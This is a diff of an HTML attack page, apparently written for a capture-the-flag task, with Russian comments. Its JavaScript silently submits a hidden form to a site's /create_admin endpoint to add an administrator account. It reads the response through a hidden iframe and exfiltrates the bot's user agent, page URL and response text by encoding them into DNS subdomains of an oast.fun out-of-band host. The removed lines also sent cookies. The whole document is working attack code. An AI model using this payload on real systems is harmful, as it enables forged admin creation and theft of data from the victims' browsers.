@@ -2,109 +2,75 @@
 <html>
 <body>
 <script>
-// 1. Функция для отправки данных чанками
-function sendToWebhookChunked(data, label) {
-    const jsonStr = JSON.stringify(data);
-    const base64Str = btoa(jsonStr);
-    
-    // Разбиваем на чанки по 30 символов (без =+/ для DNS)
-    const chunkSize = 30;
-    const cleanBase64 = base64Str.replace(/[+/=]/g, '');
-    
-    for (let i = 0; i < cleanBase64.length; i += chunkSize) {
-        const chunk = cleanBase64.substring(i, i + chunkSize);
-        const subdomain = `${label}-${Math.floor(i/chunkSize)}-${chunk}`;
-        
-        // Создаем DNS запрос через Image
-        new Image().src = `https://${subdomain}.zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/`;
-        
-        // Небольшая задержка между чанками
-        await new Promise(r => setTimeout(r, 100));
-    }
-    
-    // Отправляем мета-информацию о чанках
-    const meta = {
-        totalChunks: Math.ceil(cleanBase64.length / chunkSize),
-        totalLength: cleanBase64.length,
-        label: label
-    };
-    
-    const metaEncoded = btoa(JSON.stringify(meta)).replace(/[+/=]/g, '').substring(0, 30);
-    new Image().src = `https://meta-${label}-${metaEncoded}.zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/`;
+// Функция для отправки небольших чанков
+function sendChunk(label, data, chunkIndex) {
+    const encoded = btoa(JSON.stringify(data)).replace(/[+/=]/g, '').substring(0, 40);
+    const subdomain = `${label}${chunkIndex}-${encoded}`;
+    new Image().src = `https://${subdomain}.zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/`;
 }
 
-// 2. Создаем iframe для получения ответа
+// 1. Отправляем информацию о боте (маленькими порциями)
+const botInfo = {
+    ua: navigator.userAgent.substring(0, 100),
+    url: window.location.href,
+    time: new Date().toISOString()
+};
+sendChunk('bot', botInfo, 0);
+
+// 2. Создаем iframe
 const iframe = document.createElement('iframe');
 iframe.name = 'responseFrame';
 iframe.id = 'responseFrame';
-iframe.style.cssText = 'width:0;height:0;border:0;position:absolute;left:-9999px;';
+iframe.style.display = 'none';
 document.body.appendChild(iframe);
 
-// 3. Отправляем информацию о боте
-const botInfo = {
-    userAgent: navigator.userAgent,
-    location: window.location.href,
-    cookies: document.cookie,
-    timestamp: new Date().toISOString()
-};
-
-// Используем новую функцию для отправки
-sendToWebhookChunked(botInfo, 'botinfo');
-
-// 4. Создаем форму
+// 3. Создаем и отправляем форму
 const form = document.createElement('form');
 form.method = 'POST';
 form.action = 'https://tasks.goidactf.ru:20246/create_admin';
 form.target = 'responseFrame';
 form.style.display = 'none';
 
-const loginInput = document.createElement('input');
-loginInput.type = 'hidden';
-loginInput.name = 'new_admin_login';
-loginInput.value = 'iframe_admin_' + Date.now();
-form.appendChild(loginInput);
+const input = document.createElement('input');
+input.type = 'hidden';
+input.name = 'new_admin_login';
+input.value = 'chunked_admin_' + Date.now();
+form.appendChild(input);
 
 document.body.appendChild(form);
 form.submit();
 
-// 5. Читаем ответ из iframe через 3 секунды
-setTimeout(async () => {
+// 4. Сообщаем что форма отправлена
+sendChunk('status', {event: 'form_submitted'}, 0);
+
+// 5. Пытаемся прочитать ответ через 2 секунды
+setTimeout(() => {
     try {
         const frame = document.getElementById('responseFrame');
         const frameDoc = frame.contentDocument || frame.contentWindow.document;
         
-        let responseText = '';
-        
-        if (frameDoc.body) {
-            responseText = frameDoc.body.innerText || 
-                          frameDoc.body.textContent || 
-                          frameDoc.body.innerHTML.substring(0, 500);
-        } else if (frameDoc.documentElement) {
-            responseText = frameDoc.documentElement.innerText || 
-                          frameDoc.documentElement.textContent;
+        let responseText = 'no_body';
+        if (frameDoc && frameDoc.body) {
+            responseText = frameDoc.body.textContent || 'empty_body';
         }
         
-        // 6. Отправляем ответ чанками
-        const responseData = {
-            success: responseText.length > 0,
-            responseLength: responseText.length,
-            responsePreview: responseText.substring(0, 1000), // Берем больше
-            timestamp: new Date().toISOString()
-        };
+        // Разбиваем ответ на части если большой
+        const maxChunkLength = 100;
+        for (let i = 0; i < responseText.length; i += maxChunkLength) {
+            const chunk = {
+                part: Math.floor(i / maxChunkLength),
+                total: Math.ceil(responseText.length / maxChunkLength),
+                text: responseText.substring(i, i + maxChunkLength),
+                timestamp: new Date().toISOString()
+            };
+            
+            sendChunk('resp', chunk, Math.floor(i / maxChunkLength));
+        }
         
-        await sendToWebhookChunked(responseData, 'response');
-        
-    } catch(error) {
-        // 7. Отправляем ошибку
-        const errorData = {
-            error: error.toString().substring(0, 200),
-            errorType: 'IframeReadError',
-            timestamp: new Date().toISOString()
-        };
-        
-        await sendToWebhookChunked(errorData, 'error');
+    } catch(e) {
+        sendChunk('err', {error: e.toString().substring(0, 50)}, 0);
     }
-}, 3000);
+}, 2000);
 </script>
 </body>
 </html>
